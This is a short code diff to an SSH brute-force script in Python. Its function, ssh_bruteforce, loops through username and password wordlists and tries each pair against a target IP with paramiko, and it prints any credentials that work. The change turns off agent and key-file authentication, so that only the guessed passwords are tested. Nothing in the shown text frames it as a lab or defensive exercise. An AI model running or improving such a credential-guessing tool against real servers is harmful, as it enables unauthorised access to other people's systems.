@@ -42,7 +42,8 @@ def ssh_bruteforce(target_ip, username_wordlist, password_wordlist):
             print(f"\033[94mTrying username: {username}, password: {password}\033[0m")
 
             try:
-                client.connect(target_ip, username=username, password=password, timeout=1)
+                client.connect(target_ip, username=username, password=password, timeout=1,allow_agent=False,
+    look_for_keys=False)
                 print(f"\033[93mSuccess! Username: {username}, Password: {password}\033[0m")
                 return username, password
             except paramiko.AuthenticationException:
